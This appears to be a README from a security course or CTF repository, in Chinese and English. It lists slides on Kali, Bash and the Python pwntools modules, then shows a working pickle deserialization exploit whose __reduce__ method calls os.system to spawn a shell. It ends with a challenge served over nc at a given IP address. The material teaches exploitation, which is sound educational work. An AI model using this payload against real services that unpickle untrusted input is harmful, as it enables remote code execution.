# Slides
 1. [Linux_and_SA](Python_Linux_n_SystemAdmin/Linux_and_SA.pptx)： **Kali Linux**, **Bash Shells**
 2. [Python](Python_Linux_n_SystemAdmin/Python.pptx)：**Socket**, **Struct**, **Pwntools** modules

# Today's Vulnerable
pickle 是個可以把class serialized 和deserialized 的module，以下程式能叫出shell！
 ```python
  import pickle
  import os
  class Exploit(object):
    def __reduce__(self):
      comm = "sh"
      return (os.system, (comm,))
a = pickle.dumps(Exploit()) # searlized to String
b = pickle.loads(a) # desearlized from String
```
## Remark
 * deserialized回來時，需要告訴python 要怎麼還原回來，而這個還原方法就是在 ```__reduce__(self)```裡指定。
=> 也就是，反serialized時會call ```__reduce__(self)```
 *  ```__reduce__(self)``` 回傳的格式：[desearlized_function][argument to desearlized_function]
 => ```(os.system, (comm,))``` 會desearlized成 ```os.system("sh")```，***calling shell***!

# Get the Flag
1. [Pickle](Pickle)
 * server： ```nc 140.113.194.85 49167```
 * [server code](Pickle/spam.py)
 * Hint: pickle vulnerable
